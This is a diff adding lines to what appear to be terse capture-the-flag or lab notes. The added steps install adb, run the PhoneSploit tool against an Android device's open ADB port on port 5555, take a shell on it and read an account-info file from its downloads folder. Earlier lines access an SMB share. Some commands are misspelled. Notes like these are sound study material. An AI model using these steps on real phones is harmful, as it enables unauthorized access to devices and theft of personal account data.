@@ -18,3 +18,17 @@ smbcliet //10.10.10.2/secret -U suit -p 445
 get file.txt
 echo "encode-txt"|base64 --decode
 adb port (5555)
+apt-get install adb
+git clone https://github.com/prbhtkumr/PhoneSploit.git
+cd phonesploit
+pyhton3 phonesploit.py
+3 (Connect to new phone)
+Add IP address of android device
+4 (Access shell on phone)
+IP address again of android device
+pwd
+ls
+cd sdcard
+ls
+cd downloads
+cat accnt-info.txt
